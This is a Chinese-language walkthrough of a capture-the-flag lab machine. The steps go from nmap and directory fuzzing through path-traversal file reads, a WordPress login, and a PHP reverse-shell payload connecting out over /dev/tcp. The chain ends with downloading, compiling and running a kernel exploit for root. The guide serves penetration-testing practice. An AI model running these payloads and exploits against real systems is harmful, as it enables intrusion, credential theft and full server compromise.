第一步：
1.主机发现  nmap –sn 192.168.1.0/24   
解释：`-sn` 是一个常用选项，表示 **禁用端口扫描**，仅执行**主机发现**（Host Discovery）

2.端口扫描  nmap --min-rate 10000 -p- 192.168.1.131
`--min-rate` 是一个用于控制扫描速度的选项，用于指定nmap发送数据包的最小速率

3.服务版本和操作系统扫描

```bash
nmap -sT -sV -O -p22,80 192.168.1.131
```
 **选项解释：**

1. **`-sT`**：**TCP连接扫描（TCP Connect Scan）**
    
    - 这是最基本的扫描方式，nmap会尝试与目标主机的指定端口建立完整的TCP连接（三次握手）。
    - 如果连接成功，说明端口是开放的；如果失败，说明端口是关闭的。
    - 优点：不需要特殊权限，适用于普通用户。
    - 缺点：容易被目标主机的防火墙或入侵检测系统记录。
2. **`-sV`**：**版本探测（Version Detection）**
    
    - 在发现开放端口后，nmap会进一步探测这些端口上运行的服务及其版本信息（如Apache 2.4.7、OpenSSH 7.4等）。
    - 通过分析服务的响应，nmap会尝试识别服务类型和版本号。
3. **`-O`**：**操作系统探测（OS Detection）**
    
    - nmap会尝试通过分析目标主机的网络行为（如TCP/IP堆栈指纹）来猜测其操作系统类型（如Linux、Windows等）。
    - 需要管理员权限（root或sudo）才能运行。
4. **`-p22,80`**：**指定端口范围（Port Specification）**
    
    - 告诉nmap只扫描指定的端口（这里是22和80）。
    - 如果不指定 `-p`，nmap默认会扫描1000个常用端口。


 4.UDP扫描，22和80端口都关闭，没什么有用信息。

```bash
nmap -sU -p22,80 192.168.200.142
```
`-sU` 是一个用于指定扫描类型的选项，表示进行 **UDP扫描（UDP Scan）**


5.漏洞脚本扫描
nmap --script=vuln -p22,80 192.168.1.131
`--script=vuln` 是一个用于指定脚本扫描的选项，表示运行 **漏洞检测脚本**
**`vuln` 脚本分类：**
`vuln` 是nmap脚本的一个分类，包含多个专门用于检测漏洞的脚本。例如：

- **`http-vuln-*`**：检测HTTP服务的漏洞。
- **`smb-vuln-*`**：检测SMB服务的漏洞。
- **`ssl-*`**：检测SSL/TLS相关的漏洞。

扫描出：- **`http-enum`**：
    - **`/wordpress/: Blog`**：发现了一个WordPress博客目录。
    - **`/wordpress/wp-login.php: Wordpress login page`**：发现了WordPress的登录页面。

第二步： [web渗透](https://so.csdn.net/so/search?q=web%E6%B8%97%E9%80%8F&spm=1001.2101.3001.7020)与目录爆破
目录爆破：
dirb http://192.168.1.131

dirb http://192.168.1.131 -X .zip,.txt    解释：-X .zip,.txt：表示 DIRB 在扫描时，会尝试访问 .zip 和 .txt 文件。
结果：http://192.168.1.131/secret.txt    //see the location.txt and you will get your next move//

dirb http://192.168.1.131 -X .php
结果：---- Scanning URL: http://192.168.1.131/ ----
+ http://192.168.1.131/image.php (CODE:200|SIZE:147)                                    
+ http://192.168.1.131/index.php (CODE:200|SIZE:136)

wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  http://192.168.1.131/index.php?FUZZ=
解释：
-c：启用彩色输出，使结果更易读。
-w /usr/share/wfuzz/wordlist/general/common.txt：
指定使用的字典文件，这里是 common.txt，包含常见的参数名。
http://192.168.1.131/index.php?FUZZ=：
目标URL，FUZZ 是占位符，表示WFuzz会用字典中的内容替换它。
例如，如果字典中包含 id，WFuzz会尝试访问 http://192.168.1.131/index.php?id=。

wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.1.131/index.php?FUZZ
解释; --hh 136  过滤chars
--hc / hl / hw / hh分别是指过滤掉 code / lines /word/ char的某种结果。

curl http://192.168.1.131/index.php?file=location.txt
结果：use 'secrettier360' parameter on some other php page for more fun.

curl http://192.168.1.131/image.php?secrettier360
结果：finaly you got the right parameter

## 第三步，文件包含漏洞利用

http://192.168.1.131/image.php?secrettier360=../../../../../../../../../etc/passwd

curl http://192.168.1.131/image.php?secrettier360=../../../../../../../../etc/passwd
/etc/passwd中的账户信息有很多，重点观察有bash环境的
**1. 可登录的用户：**
- **`root:x:0:0:root:/root:/bin/bash`**：
    - **root** 用户是系统管理员，拥有最高权限。
    - 如果能够获取 root 用户的密码或通过其他方式提权，可以完全控制系统。
- **`victor:x:1000:1000:victor,,,:/home/victor:/bin/bash`**：
    - **victor** 用户是可登录的普通用户，拥有 `/home/victor` 目录。
    - 如果能够获取该用户的密码或通过其他方式登录，可以访问其主目录中的文件。
- **`saket:x:1001:1001:find password.txt file in my directory:/home/saket:`**：
    - **saket** 用户是可登录的普通用户，拥有 `/home/saket` 目录。
    - 注释中提到 **"find password.txt file in my directory"**，说明其主目录中可能存在敏感文件（如 `password.txt`）。


发现root,victor账户有bash环境，同时还在saket发现一句话，find password.txt file in my directory:/home/saket: 莫非是提醒我们在/home/saket/password.txt存在信息？ 那我们再用文件包含看一下/home/saket/password.txt

curl http://192.168.1.131/image.php?secrettier360=../../../../../../../../home/saket/password.txt
结果：follow_the_ippsec

文件包含漏洞访问之后，**password.txt中写了follow_the_ippsec ，怀疑这可能是某个账号的密码，应该是个很关键的信息**。最后再试试能不能直接访问/etc/shadow。很遗憾，并不行，浏览器和curl都无法看到回显。

- **`/etc/passwd`**：
    - 存储用户账户信息（如用户名、UID、主目录、默认 shell 等）。
    - 默认权限：`644`（所有用户可读）。
- **`/etc/shadow`**：
    - 存储用户的加密密码和密码策略信息。
    - 默认权限：`600`（仅 root 用户可读写）。
- - **`/etc/gshadow`**：
    - 存储用户组的加密密码和组管理员信息。
    - 默认权限：`600`（仅 root 用户可读写）。
- - **`/etc/ssh/sshd_config`**：
    - SSH 服务器的配置文件，包含 SSH 服务的配置选项（如端口、认证方式等）。
    - 默认权限：`600`（仅 root 用户可读写）。
- - **`/etc/ssl/` 目录**：
    - 存储系统的 SSL/TLS 证书和密钥文件。
    - 默认权限：`600`（仅 root 用户可读写）。

## 第四步：wordpress CMS渗透

 这个页面我们发现了一个名为victor的用户，恰巧也是刚才/etc/passwd中看到的有bash的用户。 然后就是寻找wordpress的登录界面了，wordpress是非常常见的cms系统，其登录页面的路径是固定的，在/wordpress/wp-admin中，浏览器访问靶机ip/wordpress/wp-admin会自动跳转至登录页面（这个路径可以google搜索到也可以在之前的扫描结果中看到）

然找到了这个登录页面，用户名和密码就用刚才的victor和follow_the_ippsec试试吧。 成功用此账户和密码登录进了cms的后台。

 接下来就是常规思路，在cms的后台寻找可以上传文件和代码执行的位置（主要是php代码）。寻找可能存在php代码编辑的位置即可。发现在Appearance => Theme Editor => Theme Files中发现了许多可编辑的php文件，可是这些文件中添加php代码后无法提交更新（没找到按钮），我们需要找到可以写入并执行php代码的位置。

最后在Theme Files（右侧栏）一直往下寻找.php文件，发现了一个名为secret.php的文件。具有可写权限，同时可以点击提交。

这个页面有一句注释/* Ohh Finaly you got a writable file */意思是我们成功找到了可写文件的位置，同时这个页面有Update File按钮，我们可以输入payload然后点这个按钮提交。

要获取shell，输入一行php的反弹shell命令即可，选择端口为443，192.168.200.131是我kali的ip，读者需要修改代码中ip和端口号，代码如下：

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.66/443 0>&1'");
?>


点击提交之后，会提示文件编辑成功，注意**此时我们仅仅是添加了代码，还没有执行**。然后就是另起一个终端接收反弹shell：

```bash
nc -lvnp 443
```

问题来了，如何找到我们设置好的secret页面路径，访问此页面触发代码执行？我们编辑secret.php经历了Appearance => Theme Editor => Theme Files的点击过程，回到以上这个路径的默认页面，即Stylesheet(style.css)的编辑页面，给出了页面路径。

https://wordpress.org/themes/twentynineteen/

因此我们要访问的路径就是/themes/twentynineteen/secret.php，至于/themes前面的路径是啥，应该是wordpress主题的固定路径，也就是/wordpress/wp-content，这个可以在互联网上搜索到wordpress的主题编辑页面的路径。因此完整的路径是：

http://192.168.1.131/wordpress/wp-content/themes/twentynineteen/secret.php

 在红队笔记大佬的视频中，直接访问了上面这链接触发了secret.php代码执行，对这个url的来历并没有详细说明，我觉得还是需要阐释一下的。主要还是源于wordpress这个cms非常著名，可以很容易地在互联网上搜索到其内部各个模块的路径。访问这个路径之后，我们在secret.php中的payload就得以执行了，回到刚才nc监听443端口的终端，成功获取了反弹shell。

## 第五步：内核漏洞提权

成功拿到了www-data的shell，我们uname -a查看操作系统版本，发现是一个比较早的内核版本了：

Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

 sudo –l查看权限，发现目录/home/saket/enc，提示信息(root) NOPASSWD: /home/saket/enc，如下图：


 试试能不能看enc，可惜没有查看enc文件的权限。


 再发现/home/saket目录下还有password.txt和user.txt，password.txt就是我们用文件包含发现的密码，user.txt是一串数字，这应该就是user的flag，查看一下：



 果然如此，我们已经拿到了user的flag，接下来就是提权，获取root权限并拿到root的flag。/enc可能是一个关键的文件，我们可以看看/home/saket目录下所有文件的权限，发现enc是没有读r权限的：

 如何提权呢？查找了一圈目录，很遗憾，没发现什么账号密码啥的敏感信息。再看看定时任务吧，找找有没有与之前的博客sickOS1.01打靶思路中类似的定时文件，可以定期以root身份运行，然后我们追加命令进行提权，cat crontab后也没啥可利用的定时文件。

 回想到uname -a看到的内核版本，是Linux ubuntu 4.10.0-28-generic，这应该是比较早的内核版本了，说不定存在可以提权的漏洞。用kali中自带的searchsploit搜索一下：

searchsploit Linux ubuntu 4.10.0-28


 发现有三个，我们要关注与提权相关的漏洞，第一个是释放后重用漏洞，第二个和第三个漏洞貌似都与权限相关，我们先把第二个45010.c下载下来试试：

searchsploit -m 45010.c


 然后在/root目录下看一下这个45010.c的使用方式：


 这个.c文件的代码很长，具体怎么进行内核提权的不是我们的重点，我们只需要关注如何使用，应该就是gcc编译一下就可以了。由于不同环境gcc编译后的文件是不同的，这里我们应该把45010.c上传到靶机环境中再在靶机中进行编译。如果靶机中没有gcc，那再考虑搭建靶机环境，本地编译再上传。此处我们在kali中启动一个http服务,开放80端口（用php或者python都可以，我这里就用php了）：

php -S 0:80


 然后用www-data的shell把访问kali启动的http服务器，把45010.c下载到本地。选择/tmp目录是因为这个目录的权限比较方便设置，注意要把命令中的ip改为kali：

wget http://192.168.200.131/45010.c


 kali中启动的http服务也显示，靶机成功get了45010.c：



 然后在靶机中编译，编译后起名为getRoot(读者可以起别的名字)，没有报错：

gcc 45010.c -o getRoot


 然后运行./getRoot，即可提权为root，运行whoami，果然成为root了。注意如果编译后的getRoot没有执行权限，需要先添加x权限 chmod +x getRoot

chmod +x getRoot
./getRoot


 此时应该已经拿下这台服务器了，不过这个shell交互性比较差，我们还是试试能否用python获得交互性更好的shell：

python -c "import pty;pty.spawn('/bin/bash')"


 成功运行了python的shell，sudo –l查看权限，已经是三个all，接下来就是查看root的flag，应该就在/root目录下，存在一个root.txt，这个就是root的flag。

 至此打靶完成！
 
1.主机发现与端口扫描

2.目录爆破：发现提示文件让我们深挖目录，搜索.txt文件找到了secret.txt提示我们进行模糊测试。

3.模糊测试：用wfuzz工具进行模糊测试，一路依照提示进行尝试，最后找到了合适的参数。

4.文件包含利用：用上一步发现的url中的参数进行文件包含，查看/etc/passwd，成功看到信息，重点其中有shell环境的账户，并看到了有关/home/saket/passord.txt的提示，拿到了一个密码。

5.wordpress渗透：想办法利用第4步拿到的密码，后台登录wordpress，寻找可以代码执行的点，写入php反弹shell的payload并找到响应的路径进行代码执行。成功拿到了www-data的shell。

6.提权：利用www-data的shell去探索敏感信息，收获不大，最后发现内核版本的漏洞，成功提权。
